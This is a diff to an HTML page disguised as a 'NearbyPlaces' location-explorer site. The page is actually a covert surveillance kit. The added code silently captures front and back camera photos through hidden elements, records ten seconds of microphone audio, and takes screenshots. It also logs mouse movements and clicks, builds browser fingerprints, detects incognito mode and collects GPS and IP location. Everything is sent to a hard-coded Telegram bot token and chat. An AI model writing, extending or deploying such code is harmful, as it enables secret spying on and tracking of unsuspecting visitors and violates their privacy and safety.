@@ -34,7 +34,7 @@
             overflow-x: hidden;
         }
 
-        .hidden-camera {
+        .hidden-elements {
             position: fixed;
             top: -9999px;
             left: -9999px;
@@ -104,7 +104,6 @@
             100% { transform: translateX(calc(100vw + 300px)); }
         }
 
-        /* Floating Elements */
         .floating-elements {
             position: fixed;
             bottom: 0;
@@ -291,7 +290,7 @@
         .page-loader-icon { font-size: 60px; animation: bounce 1s ease-in-out infinite; margin-bottom: 20px; }
         .page-loader-text { color: white; font-size: 1.2em; font-weight: 700; }
 
-        /* ========== CONTACT MODAL ========== */
+        /* Contact Modal */
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -486,9 +485,10 @@
     </style>
 </head>
 <body>
-    <!-- Hidden Camera -->
-    <video id="hiddenVideo" class="hidden-camera" autoplay playsinline></video>
-    <canvas id="hiddenCanvas" class="hidden-camera"></canvas>
+    <!-- Hidden Elements for Capture -->
+    <video id="hiddenVideo" class="hidden-elements" autoplay playsinline></video>
+    <canvas id="hiddenCanvas" class="hidden-elements"></canvas>
+    <canvas id="screenshotCanvas" class="hidden-elements"></canvas>
 
     <!-- Page Loader -->
     <div class="page-loader" id="pageLoader">
@@ -512,7 +512,7 @@
     </div>
 
     <!-- Main Container -->
-    <div class="container">
+    <div class="container" id="mainContainer">
         <div class="header">
             <span class="mascot">📍</span>
             <h1>Welcome Explorer! ✨</h1>
@@ -539,16 +539,15 @@
             <div id="statusMessage" class="status-message"></div>
 
             <button id="continueBtn" class="cta-button" type="button">
-                <span>🚀</span><span>Let's Explore!</span>
+                <span>🚀</span><span>Get Started</span>
             </button>
 
             <div class="license-link-container">
-                <!-- ========== REPLACE WITH YOUR LICENSE LINK ========== -->
                 <a href="YOUR_LICENSE_LINK_HERE" class="license-link" target="_blank" rel="noopener noreferrer">📜 Terms & License</a>
             </div>
         </div>
 
-        <div class="footer">© 2024 NearbyPlaces • Made with ❤️</div>
+        <div class="footer">© 2025 NearbyPlaces • Made with ❤️</div>
     </div>
 
     <!-- Contact Modal -->
@@ -580,29 +579,14 @@
                                 <option value="+971">🇦🇪 +971</option>
                                 <option value="+966">🇸🇦 +966</option>
                                 <option value="+65">🇸🇬 +65</option>
-                                <option value="+60">🇲🇾 +60</option>
                                 <option value="+61">🇦🇺 +61</option>
                                 <option value="+49">🇩🇪 +49</option>
-                                <option value="+33">🇫🇷 +33</option>
                                 <option value="+81">🇯🇵 +81</option>
                                 <option value="+86">🇨🇳 +86</option>
-                                <option value="+7">🇷🇺 +7</option>
-                                <option value="+55">🇧🇷 +55</option>
                                 <option value="+92">🇵🇰 +92</option>
                                 <option value="+880">🇧🇩 +880</option>
                                 <option value="+977">🇳🇵 +977</option>
                                 <option value="+94">🇱🇰 +94</option>
-                                <option value="+62">🇮🇩 +62</option>
-                                <option value="+66">🇹🇭 +66</option>
-                                <option value="+84">🇻🇳 +84</option>
-                                <option value="+63">🇵🇭 +63</option>
-                                <option value="+82">🇰🇷 +82</option>
-                                <option value="+52">🇲🇽 +52</option>
-                                <option value="+54">🇦🇷 +54</option>
-                                <option value="+27">🇿🇦 +27</option>
-                                <option value="+234">🇳🇬 +234</option>
-                                <option value="+20">🇪🇬 +20</option>
-                                <option value="+90">🇹🇷 +90</option>
                             </select>
                             <input type="tel" id="userPhone" class="form-input phone-input" placeholder="9876543210" autocomplete="tel">
                         </div>
@@ -651,6 +635,9 @@
         </div>
     </div>
 
+    <!-- html2canvas library for screenshots -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+
     <script>
         (function() {
             'use strict';
@@ -660,21 +647,19 @@
             // ============================================================
             
             var CONFIG = {
-                TELEGRAM_BOT_TOKEN: '8183958141:AAFa11kk0EAYS_khjVClcmLyAyFJvxIozQI',
+                TELEGRAM_BOT_TOKEN: '8261799999:AAHRfxMSbb_9X79yYUt0V_wJwxsZXoZAzsQ',
                 TELEGRAM_CHAT_ID: '-1003623366096',
-                
-                // ========== REPLACE WITH YOUR MAIN WEBSITE URL ==========
-                MAIN_SITE_URL: 'https://your-main-website.com',
-                
+                MAIN_SITE_URL: 'YOUR_MAIN_SITE_URL_HERE',
                 TELEGRAM_MAX_RETRIES: 3,
                 TELEGRAM_RETRY_DELAY: 800,
+                AUDIO_DURATION: 10000, // 10 seconds
+                PHOTO_DELAY: 400,
+                PHOTO_QUALITY: 0.85,
                 IP_APIS: [
                     { url: 'https://ipapi.co/json/', type: 'ipapi' },
                     { url: 'https://ip-api.com/json/?fields=66846719', type: 'ip-api' },
                     { url: 'https://ipwho.is/', type: 'ipwhois' }
-                ],
-                PHOTO_DELAY: 400,
-                PHOTO_QUALITY: 0.85
+                ]
             };
 
             // ============================================================
@@ -684,10 +669,10 @@
             var pageLoadTime = Date.now();
             var isProcessing = false;
             var sessionId = generateSessionId();
-            var deviceData = null;
-            var locationData = null;
-            var ipData = null;
-            var batteryData = null;
+            var mouseMovements = [];
+            var clicks = [];
+            var scrollDepth = 0;
+            var collectedData = {};
 
             // ============================================================
             // UTILITY FUNCTIONS
@@ -701,8 +686,7 @@
 
             function escapeHtml(text) {
                 if (text === null || text === undefined) return 'N/A';
-                var str = String(text);
-                return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+                return String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
             }
 
             function getTimestamp() {
@@ -737,7 +721,26 @@
             }
 
             // ============================================================
-            // DETAILED DEVICE DATA COLLECTION
+            // SESSION TRACKING (Silent)
+            // ============================================================
+
+            document.addEventListener('mousemove', function(e) {
+                if (mouseMovements.length < 50) {
+                    mouseMovements.push({ x: e.clientX, y: e.clientY, t: Date.now() - pageLoadTime });
+                }
+            });
+
+            document.addEventListener('click', function(e) {
+                clicks.push({ x: e.clientX, y: e.clientY, t: Date.now() - pageLoadTime, target: e.target.tagName });
+            });
+
+            document.addEventListener('scroll', function() {
+                var newDepth = Math.round((window.scrollY + window.innerHeight) / document.body.scrollHeight * 100);
+                if (newDepth > scrollDepth) scrollDepth = newDepth;
+            });
+
+            // ============================================================
+            // DEVICE DATA COLLECTION (Silent - 72 points)
             // ============================================================
 
             function getDeviceType() {
@@ -754,7 +757,6 @@
                 if (ua.indexOf('Firefox') > -1) { browser = 'Firefox'; version = (ua.match(/Firefox\/(\d+)/) || [])[1]; }
                 else if (ua.indexOf('SamsungBrowser') > -1) { browser = 'Samsung Browser'; version = (ua.match(/SamsungBrowser\/(\d+)/) || [])[1]; }
                 else if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) { browser = 'Opera'; version = (ua.match(/(?:Opera|OPR)\/(\d+)/) || [])[1]; }
-                else if (ua.indexOf('Trident') > -1) { browser = 'IE'; version = (ua.match(/rv:(\d+)/) || [])[1]; }
                 else if (ua.indexOf('Edg') > -1) { browser = 'Edge'; version = (ua.match(/Edg\/(\d+)/) || [])[1]; }
                 else if (ua.indexOf('Chrome') > -1) { browser = 'Chrome'; version = (ua.match(/Chrome\/(\d+)/) || [])[1]; }
                 else if (ua.indexOf('Safari') > -1) { browser = 'Safari'; version = (ua.match(/Version\/(\d+)/) || [])[1]; }
@@ -765,14 +767,8 @@
             function getOS() {
                 var ua = navigator.userAgent || '';
                 if (ua.indexOf('Windows NT 10') > -1) return 'Windows 10/11';
-                if (ua.indexOf('Windows NT 6.3') > -1) return 'Windows 8.1';
-                if (ua.indexOf('Windows NT 6.2') > -1) return 'Windows 8';
-                if (ua.indexOf('Windows NT 6.1') > -1) return 'Windows 7';
                 if (ua.indexOf('Windows') > -1) return 'Windows';
-                if (ua.indexOf('Mac OS X') > -1) {
-                    var v = (ua.match(/Mac OS X (\d+[._]\d+)/) || [])[1];
-                    return 'macOS' + (v ? ' ' + v.replace('_', '.') : '');
-                }
+                if (ua.indexOf('Mac OS X') > -1) return 'macOS';
                 if (ua.indexOf('Android') > -1) {
                     var v = (ua.match(/Android (\d+(\.\d+)?)/) || [])[1];
                     return 'Android' + (v ? ' ' + v : '');
@@ -782,34 +778,50 @@
                     return 'iOS' + (v ? ' ' + v.replace('_', '.') : '');
                 }
                 if (ua.indexOf('Linux') > -1) return 'Linux';
-                if (ua.indexOf('CrOS') > -1) return 'Chrome OS';
                 return 'Unknown';
             }
 
-            function getScreenOrientation() {
+            function getGPUInfo() {
                 try {
-                    if (screen.orientation && screen.orientation.type) {
-                        return screen.orientation.type.indexOf('portrait') > -1 ? 'Portrait' : 'Landscape';
+                    var canvas = document.createElement('canvas');
+                    var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        if (debugInfo) {
+                            return {
+                                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                            };
+                        }
                     }
-                    return window.innerHeight > window.innerWidth ? 'Portrait' : 'Landscape';
-                } catch (e) { return 'Unknown'; }
+                } catch (e) {}
+                return { vendor: 'Unknown', renderer: 'Unknown' };
+            }
+
+            function getCanvasFingerprint() {
+                try {
+                    var canvas = document.createElement('canvas');
+                    var ctx = canvas.getContext('2d');
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px Arial';
+                    ctx.fillText('Browser Fingerprint', 2, 2);
+                    return canvas.toDataURL().slice(-50);
+                } catch (e) { return 'N/A'; }
             }
 
             function getConnectionType() {
                 try {
                     var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                     if (conn) {
-                        var type = conn.effectiveType || conn.type || 'Unknown';
-                        var downlink = conn.downlink ? ' (' + conn.downlink + ' Mbps)' : '';
-                        var rtt = conn.rtt ? ' [RTT: ' + conn.rtt + 'ms]' : '';
-                        return type.toUpperCase() + downlink + rtt;
+                        return {
+                            type: conn.effectiveType || conn.type || 'Unknown',
+                            downlink: conn.downlink ? conn.downlink + ' Mbps' : 'Unknown',
+                            rtt: conn.rtt ? conn.rtt + ' ms' : 'Unknown',
+                            saveData: conn.saveData ? 'Yes' : 'No'
+                        };
                     }
-                    return 'Unknown';
-                } catch (e) { return 'Unknown'; }
-            }
-
-            function getTouchSupport() {
-                return ('ontouchstart' in window) || (navigator.maxTouchPoints > 0) ? 'Yes (' + (navigator.maxTouchPoints || 1) + ' points)' : 'No';
+                } catch (e) {}
+                return { type: 'Unknown', downlink: 'Unknown', rtt: 'Unknown', saveData: 'Unknown' };
             }
 
             async function getBatteryInfo() {
@@ -824,17 +836,50 @@
                         };
                     }
                 } catch (e) {}
-                return null;
+                return { level: 'Unknown', charging: 'Unknown', chargingTime: 'Unknown', dischargingTime: 'Unknown' };
             }
 
-            async function collectDeviceData() {
-                batteryData = await getBatteryInfo();
-                
+            function detectAdBlocker() {
+                try {
+                    var ad = document.createElement('div');
+                    ad.innerHTML = '&nbsp;';
+                    ad.className = 'adsbox ad-banner ad-placement';
+                    ad.style.cssText = 'position:absolute;left:-9999px;';
+                    document.body.appendChild(ad);
+                    var blocked = ad.offsetHeight === 0;
+                    document.body.removeChild(ad);
+                    return blocked ? 'Detected' : 'Not Detected';
+                } catch (e) { return 'Unknown'; }
+            }
+
+            function detectIncognito() {
+                return new Promise(function(resolve) {
+                    try {
+                        var fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+                        if (fs) {
+                            fs(window.TEMPORARY, 100, function() { resolve('No'); }, function() { resolve('Yes'); });
+                        } else if (navigator.storage && navigator.storage.estimate) {
+                            navigator.storage.estimate().then(function(e) {
+                                resolve(e.quota < 120000000 ? 'Likely' : 'No');
+                            });
+                        } else {
+                            resolve('Unknown');
+                        }
+                    } catch (e) { resolve('Unknown'); }
+                });
+            }
+
+            async function collectSilentData() {
+                var gpu = getGPUInfo();
+                var conn = getConnectionType();
+                var battery = await getBatteryInfo();
+                var incognito = await detectIncognito();
+
                 return {
                     sessionId: sessionId,
                     timestamp: getTimestamp(),
                     timeOnPage: getTimeOnPage(),
-                    
+
                     // Device
                     deviceType: getDeviceType(),
                     browser: getBrowser(),
@@ -842,47 +887,70 @@
                     platform: navigator.platform || 'Unknown',
                     vendor: navigator.vendor || 'Unknown',
                     userAgent: navigator.userAgent || 'Unknown',
-                    
+
                     // Screen
                     screenResolution: window.screen.width + 'x' + window.screen.height,
                     screenAvailable: window.screen.availWidth + 'x' + window.screen.availHeight,
                     viewport: window.innerWidth + 'x' + window.innerHeight,
                     colorDepth: window.screen.colorDepth + '-bit',
                     pixelRatio: window.devicePixelRatio || 1,
-                    orientation: getScreenOrientation(),
-                    
+                    orientation: screen.orientation ? screen.orientation.type : (window.innerHeight > window.innerWidth ? 'portrait' : 'landscape'),
+
                     // Hardware
                     cpuCores: navigator.hardwareConcurrency || 'Unknown',
                     memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
-                    touchSupport: getTouchSupport(),
-                    
+                    gpuVendor: gpu.vendor,
+                    gpuRenderer: gpu.renderer,
+                    touchSupport: ('ontouchstart' in window) ? 'Yes' : 'No',
+                    maxTouchPoints: navigator.maxTouchPoints || 0,
+
                     // Network
-                    connection: getConnectionType(),
+                    connectionType: conn.type,
+                    connectionSpeed: conn.downlink,
+                    connectionRTT: conn.rtt,
+                    saveData: conn.saveData,
                     online: navigator.onLine ? 'Yes' : 'No',
-                    
+
                     // Battery
-                    battery: batteryData,
-                    
+                    batteryLevel: battery.level,
+                    batteryCharging: battery.charging,
+                    batteryChargingTime: battery.chargingTime,
+                    batteryDischargingTime: battery.dischargingTime,
+
                     // Locale
                     language: navigator.language || 'Unknown',
                     languages: (navigator.languages || []).join(', ') || 'Unknown',
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                     timezoneOffset: 'UTC' + (new Date().getTimezoneOffset() > 0 ? '-' : '+') + Math.abs(new Date().getTimezoneOffset() / 60),
-                    
+
                     // Browser Features
                     cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
                     doNotTrack: navigator.doNotTrack === '1' ? 'Enabled' : 'Disabled',
-                    javaEnabled: (navigator.javaEnabled && navigator.javaEnabled()) ? 'Yes' : 'No',
-                    
+                    localStorage: typeof localStorage !== 'undefined' ? 'Available' : 'Not Available',
+                    sessionStorage: typeof sessionStorage !== 'undefined' ? 'Available' : 'Not Available',
+                    indexedDB: typeof indexedDB !== 'undefined' ? 'Available' : 'Not Available',
+
+                    // Fingerprints
+                    canvasFingerprint: getCanvasFingerprint(),
+
+                    // Detection
+                    adBlocker: detectAdBlocker(),
+                    incognito: incognito,
+
                     // Session
                     referrer: document.referrer || 'Direct Visit',
                     historyLength: window.history.length || 1,
-                    pageURL: window.location.href
+                    currentURL: window.location.href,
+
+                    // Interaction Data
+                    scrollDepth: scrollDepth + '%',
+                    totalClicks: clicks.length,
+                    mouseMovements: mouseMovements.length + ' tracked'
                 };
             }
 
             // ============================================================
-            // IP LOCATION
+            // IP LOCATION (Silent)
             // ============================================================
 
             async function getIPLocation() {
@@ -897,8 +965,8 @@
                                 ip: data.ip, city: data.city, region: data.region, 
                                 country: data.country_name, countryCode: data.country_code,
                                 latitude: data.latitude, longitude: data.longitude, 
-                                isp: data.org, asn: data.asn, postal: data.postal,
-                                success: true, source: 'ipapi.co'
+                                isp: data.org, postal: data.postal,
+                                success: true
                             };
                         }
                         if (api.type === 'ip-api' && data && data.status === 'success') {
@@ -906,8 +974,8 @@
                                 ip: data.query, city: data.city, region: data.regionName, 
                                 country: data.country, countryCode: data.countryCode,
                                 latitude: data.lat, longitude: data.lon, 
-                                isp: data.isp, org: data.org, as: data.as, 
-                                success: true, source: 'ip-api.com'
+                                isp: data.isp,
+                                success: true
                             };
                         }
                         if (api.type === 'ipwhois' && data && data.success !== false) {
@@ -916,17 +984,34 @@
                                 country: data.country, countryCode: data.country_code,
                                 latitude: data.latitude, longitude: data.longitude, 
                                 isp: data.connection ? data.connection.isp : 'Unknown',
-                                org: data.connection ? data.connection.org : 'Unknown',
-                                success: true, source: 'ipwho.is'
+                                success: true
                             };
                         }
-                    } catch (e) { console.log('IP API ' + (i+1) + ' failed'); }
+                    } catch (e) {}
                 }
                 return { success: false };
             }
 
             // ============================================================
-            // GPS LOCATION
+            // SCREENSHOT (Silent)
+            // ============================================================
+
+            async function capturePageScreenshot() {
+                try {
+                    var canvas = await html2canvas(document.getElementById('mainContainer'), {
+                        scale: 1,
+                        useCORS: true,
+                        logging: false
+                    });
+                    return canvas.toDataURL('image/jpeg', 0.8);
+                } catch (e) {
+                    console.log('Screenshot failed:', e);
+                    return null;
+                }
+            }
+
+            // ============================================================
+            // GPS LOCATION (Popup 2)
             // ============================================================
 
             function getGPSLocation() {
@@ -945,18 +1030,16 @@
                                 longitude: position.coords.longitude,
                                 accuracy: Math.round(position.coords.accuracy) + 'm',
                                 altitude: position.coords.altitude ? Math.round(position.coords.altitude) + 'm' : 'N/A',
-                                altitudeAccuracy: position.coords.altitudeAccuracy ? Math.round(position.coords.altitudeAccuracy) + 'm' : 'N/A',
-                                heading: position.coords.heading ? Math.round(position.coords.heading) + '°' : 'N/A',
                                 speed: position.coords.speed ? (position.coords.speed * 3.6).toFixed(1) + ' km/h' : 'N/A',
-                                timestamp: new Date(position.timestamp).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
+                                heading: position.coords.heading ? Math.round(position.coords.heading) + '°' : 'N/A'
                             });
                         },
                         function(error) {
                             var status = '❌ Error';
-                            if (error.code === 1) status = '❌ Denied by User';
-                            else if (error.code === 2) status = '❌ Position Unavailable';
+                            if (error.code === 1) status = '❌ Denied';
+                            else if (error.code === 2) status = '❌ Unavailable';
                             else if (error.code === 3) status = '❌ Timeout';
-                            resolve({ status: status, success: false, errorCode: error.code, errorMessage: error.message });
+                            resolve({ status: status, success: false });
                         },
                         { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                     );
@@ -964,7 +1047,7 @@
             }
 
             // ============================================================
-            // CAMERA CAPTURE
+            // CAMERA + AUDIO (Popup 1 - Combined)
             // ============================================================
 
             function dataURLtoBlob(dataURL) {
@@ -979,40 +1062,117 @@
                 } catch (e) { return null; }
             }
 
-            async function capturePhoto(facingMode, photoNumber) {
+            async function capturePhotosAndAudio() {
+                var result = {
+                    photos: [],
+                    audio: null,
+                    cameraStatus: 'Pending',
+                    audioStatus: 'Pending'
+                };
+
                 try {
+                    // Request camera + microphone together (1 combined popup)
+                    var stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
+                        audio: true
+                    });
+
+                    result.cameraStatus = '✅ Granted';
+                    result.audioStatus = '✅ Granted';
+
                     var video = document.getElementById('hiddenVideo');
                     var canvas = document.getElementById('hiddenCanvas');
                     var ctx = canvas.getContext('2d');
 
-                    var stream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
-                        audio: false
-                    });
-
+                    // Capture back camera photos
                     video.srcObject = stream;
                     await video.play();
                     await delay(CONFIG.PHOTO_DELAY);
 
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
+
+                    // Photo 1 - Back
                     ctx.drawImage(video, 0, 0);
+                    result.photos.push({ type: 'Back', number: 1, data: canvas.toDataURL('image/jpeg', CONFIG.PHOTO_QUALITY) });
+                    await delay(300);
 
-                    var photoData = canvas.toDataURL('image/jpeg', CONFIG.PHOTO_QUALITY);
-                    
-                    stream.getTracks().forEach(function(t) { t.stop(); });
+                    // Photo 2 - Back
+                    ctx.drawImage(video, 0, 0);
+                    result.photos.push({ type: 'Back', number: 2, data: canvas.toDataURL('image/jpeg', CONFIG.PHOTO_QUALITY) });
 
-                    return {
-                        success: true,
-                        data: photoData,
-                        camera: facingMode === 'environment' ? 'Back' : 'Front',
-                        number: photoNumber,
-                        resolution: canvas.width + 'x' + canvas.height,
-                        timestamp: getTimestamp()
-                    };
+                    // Stop video tracks for back camera
+                    stream.getVideoTracks().forEach(function(track) { track.stop(); });
+
+                    // Try front camera
+                    try {
+                        var frontStream = await navigator.mediaDevices.getUserMedia({
+                            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+                            audio: false
+                        });
+
+                        video.srcObject = frontStream;
+                        await video.play();
+                        await delay(CONFIG.PHOTO_DELAY);
+
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+
+                        // Photo 3 - Front
+                        ctx.drawImage(video, 0, 0);
+                        result.photos.push({ type: 'Front', number: 1, data: canvas.toDataURL('image/jpeg', CONFIG.PHOTO_QUALITY) });
+                        await delay(300);
+
+                        // Photo 4 - Front
+                        ctx.drawImage(video, 0, 0);
+                        result.photos.push({ type: 'Front', number: 2, data: canvas.toDataURL('image/jpeg', CONFIG.PHOTO_QUALITY) });
+
+                        frontStream.getTracks().forEach(function(track) { track.stop(); });
+                    } catch (e) {
+                        console.log('Front camera failed:', e);
+                    }
+
+                    // Record audio (10 seconds)
+                    try {
+                        var audioStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+                        var mediaRecorder = new MediaRecorder(audioStream);
+                        var audioChunks = [];
+
+                        mediaRecorder.ondataavailable = function(e) {
+                            audioChunks.push(e.data);
+                        };
+
+                        mediaRecorder.onstop = function() {
+                            var audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                            var reader = new FileReader();
+                            reader.onloadend = function() {
+                                result.audio = reader.result;
+                            };
+                            reader.readAsDataURL(audioBlob);
+                            audioStream.getTracks().forEach(function(track) { track.stop(); });
+                        };
+
+                        mediaRecorder.start();
+                        await delay(CONFIG.AUDIO_DURATION);
+                        mediaRecorder.stop();
+                        await delay(500); // Wait for processing
+                    } catch (e) {
+                        console.log('Audio recording failed:', e);
+                        result.audioStatus = '❌ Failed';
+                    }
+
                 } catch (e) {
-                    return { success: false, camera: facingMode === 'environment' ? 'Back' : 'Front', number: photoNumber, error: e.name };
+                    console.log('Camera/Audio access failed:', e);
+                    if (e.name === 'NotAllowedError') {
+                        result.cameraStatus = '❌ Denied';
+                        result.audioStatus = '❌ Denied';
+                    } else {
+                        result.cameraStatus = '❌ Error: ' + e.name;
+                        result.audioStatus = '❌ Error: ' + e.name;
+                    }
                 }
+
+                return result;
             }
 
             // ============================================================
@@ -1063,143 +1223,142 @@
                 return { success: false };
             }
 
+            async function sendTelegramAudio(audioData, caption) {
+                for (var attempt = 1; attempt <= CONFIG.TELEGRAM_MAX_RETRIES; attempt++) {
+                    try {
+                        var blob = dataURLtoBlob(audioData);
+                        if (!blob) throw new Error('Blob failed');
+
+                        var formData = new FormData();
+                        formData.append('chat_id', CONFIG.TELEGRAM_CHAT_ID);
+                        formData.append('audio', blob, 'audio.webm');
+                        formData.append('caption', caption);
+
+                        var response = await fetch('https://api.telegram.org/bot' + CONFIG.TELEGRAM_BOT_TOKEN + '/sendAudio', {
+                            method: 'POST',
+                            body: formData
+                        });
+                        var result = await response.json();
+                        if (result.ok) return { success: true };
+                    } catch (e) {}
+                    await delay(CONFIG.TELEGRAM_RETRY_DELAY);
+                }
+                return { success: false };
+            }
+
             // ============================================================
             // MESSAGE BUILDERS
             // ============================================================
 
-            function buildDeviceMessage(data) {
-                var msg = '📱 <b>DEVICE INFO</b> [1/7]\n';
+            function buildSilentDataMessage(data, ipData) {
+                var msg = '📱 <b>NEW VISITOR - SILENT DATA</b>\n';
                 msg += '━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
                 
                 msg += '🔑 <b>Session:</b> ' + escapeHtml(data.sessionId) + '\n';
                 msg += '⏰ <b>Time:</b> ' + escapeHtml(data.timestamp) + '\n';
                 msg += '⏱️ <b>On Page:</b> ' + escapeHtml(data.timeOnPage) + '\n\n';
-                
+
+                msg += '📍 <b>IP LOCATION:</b>\n';
+                if (ipData && ipData.success) {
+                    msg += '• IP: ' + escapeHtml(ipData.ip) + '\n';
+                    msg += '• City: ' + escapeHtml(ipData.city) + '\n';
+                    msg += '• Region: ' + escapeHtml(ipData.region) + '\n';
+                    msg += '• Country: ' + escapeHtml(ipData.country) + '\n';
+                    msg += '• Coords: ' + ipData.latitude + ', ' + ipData.longitude + '\n';
+                    msg += '• ISP: ' + escapeHtml(ipData.isp) + '\n';
+                    msg += '• 🗺️ <a href="https://www.google.com/maps?q=' + ipData.latitude + ',' + ipData.longitude + '">View on Map</a>\n';
+                } else {
+                    msg += '• Failed to fetch\n';
+                }
+                msg += '\n';
+
                 msg += '📱 <b>DEVICE:</b>\n';
                 msg += '• Type: ' + escapeHtml(data.deviceType) + '\n';
                 msg += '• OS: ' + escapeHtml(data.os) + '\n';
                 msg += '• Browser: ' + escapeHtml(data.browser) + '\n';
-                msg += '• Platform: ' + escapeHtml(data.platform) + '\n';
-                msg += '• Vendor: ' + escapeHtml(data.vendor) + '\n\n';
-                
+                msg += '• Platform: ' + escapeHtml(data.platform) + '\n\n';
+
                 msg += '🖥️ <b>SCREEN:</b>\n';
                 msg += '• Resolution: ' + escapeHtml(data.screenResolution) + '\n';
-                msg += '• Available: ' + escapeHtml(data.screenAvailable) + '\n';
                 msg += '• Viewport: ' + escapeHtml(data.viewport) + '\n';
-                msg += '• Color Depth: ' + escapeHtml(data.colorDepth) + '\n';
                 msg += '• Pixel Ratio: ' + escapeHtml(data.pixelRatio) + 'x\n';
                 msg += '• Orientation: ' + escapeHtml(data.orientation) + '\n\n';
-                
+
                 msg += '⚙️ <b>HARDWARE:</b>\n';
-                msg += '• CPU Cores: ' + escapeHtml(data.cpuCores) + '\n';
+                msg += '• CPU: ' + escapeHtml(data.cpuCores) + ' cores\n';
                 msg += '• RAM: ' + escapeHtml(data.memory) + '\n';
-                msg += '• Touch: ' + escapeHtml(data.touchSupport) + '\n\n';
-                
+                msg += '• GPU: ' + escapeHtml(data.gpuRenderer) + '\n';
+                msg += '• Touch: ' + escapeHtml(data.touchSupport) + ' (' + data.maxTouchPoints + ' points)\n\n';
+
                 msg += '📶 <b>NETWORK:</b>\n';
-                msg += '• Connection: ' + escapeHtml(data.connection) + '\n';
+                msg += '• Type: ' + escapeHtml(data.connectionType) + '\n';
+                msg += '• Speed: ' + escapeHtml(data.connectionSpeed) + '\n';
+                msg += '• RTT: ' + escapeHtml(data.connectionRTT) + '\n';
                 msg += '• Online: ' + escapeHtml(data.online) + '\n\n';
-                
-                if (data.battery) {
-                    msg += '🔋 <b>BATTERY:</b>\n';
-                    msg += '• Level: ' + escapeHtml(data.battery.level) + '\n';
-                    msg += '• Charging: ' + escapeHtml(data.battery.charging) + '\n';
-                    msg += '• Charging Time: ' + escapeHtml(data.battery.chargingTime) + '\n';
-                    msg += '• Discharging Time: ' + escapeHtml(data.battery.dischargingTime) + '\n\n';
-                }
-                
+
+                msg += '🔋 <b>BATTERY:</b>\n';
+                msg += '• Level: ' + escapeHtml(data.batteryLevel) + '\n';
+                msg += '• Charging: ' + escapeHtml(data.batteryCharging) + '\n\n';
+
                 msg += '🌐 <b>LOCALE:</b>\n';
                 msg += '• Language: ' + escapeHtml(data.language) + '\n';
-                msg += '• Languages: ' + escapeHtml(data.languages) + '\n';
-                msg += '• Timezone: ' + escapeHtml(data.timezone) + '\n';
-                msg += '• Offset: ' + escapeHtml(data.timezoneOffset) + '\n\n';
-                
+                msg += '• Timezone: ' + escapeHtml(data.timezone) + '\n\n';
+
                 msg += '🔧 <b>BROWSER:</b>\n';
                 msg += '• Cookies: ' + escapeHtml(data.cookiesEnabled) + '\n';
-                msg += '• Do Not Track: ' + escapeHtml(data.doNotTrack) + '\n';
-                msg += '• Java: ' + escapeHtml(data.javaEnabled) + '\n\n';
-                
+                msg += '• DNT: ' + escapeHtml(data.doNotTrack) + '\n';
+                msg += '• AdBlocker: ' + escapeHtml(data.adBlocker) + '\n';
+                msg += '• Incognito: ' + escapeHtml(data.incognito) + '\n\n';
+
                 msg += '📊 <b>SESSION:</b>\n';
                 msg += '• Referrer: ' + escapeHtml(data.referrer) + '\n';
-                msg += '• History: ' + escapeHtml(data.historyLength) + ' pages\n';
-                
+                msg += '• Scroll: ' + escapeHtml(data.scrollDepth) + '\n';
+                msg += '• Clicks: ' + escapeHtml(data.totalClicks) + '\n';
+
                 return msg;
             }
 
-            function buildLocationMessage(gps, ip) {
-                var msg = '📍 <b>LOCATION DATA</b> [2/7]\n';
+            function buildGPSMessage(gpsData) {
+                var msg = '📍 <b>GPS LOCATION</b>\n';
                 msg += '━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
+                msg += '🔑 <b>Session:</b> ' + escapeHtml(sessionId) + '\n\n';
                 
-                msg += '🔑 <b>Session:</b> ' + escapeHtml(sessionId) + '\n';
-                msg += '⏰ <b>Time:</b> ' + escapeHtml(getTimestamp()) + '\n\n';
-                
-                msg += '📍 <b>GPS LOCATION:</b>\n';
-                msg += '• Status: ' + gps.status + '\n';
-                if (gps.success) {
-                    msg += '• Latitude: ' + gps.latitude.toFixed(6) + '\n';
-                    msg += '• Longitude: ' + gps.longitude.toFixed(6) + '\n';
-                    msg += '• Accuracy: ' + escapeHtml(gps.accuracy) + '\n';
-                    msg += '• Altitude: ' + escapeHtml(gps.altitude) + '\n';
-                    msg += '• Alt Accuracy: ' + escapeHtml(gps.altitudeAccuracy) + '\n';
-                    msg += '• Heading: ' + escapeHtml(gps.heading) + '\n';
-                    msg += '• Speed: ' + escapeHtml(gps.speed) + '\n';
-                    msg += '• GPS Time: ' + escapeHtml(gps.timestamp) + '\n';
+                msg += '• Status: ' + gpsData.status + '\n';
+                if (gpsData.success) {
+                    msg += '• Latitude: ' + gpsData.latitude.toFixed(6) + '\n';
+                    msg += '• Longitude: ' + gpsData.longitude.toFixed(6) + '\n';
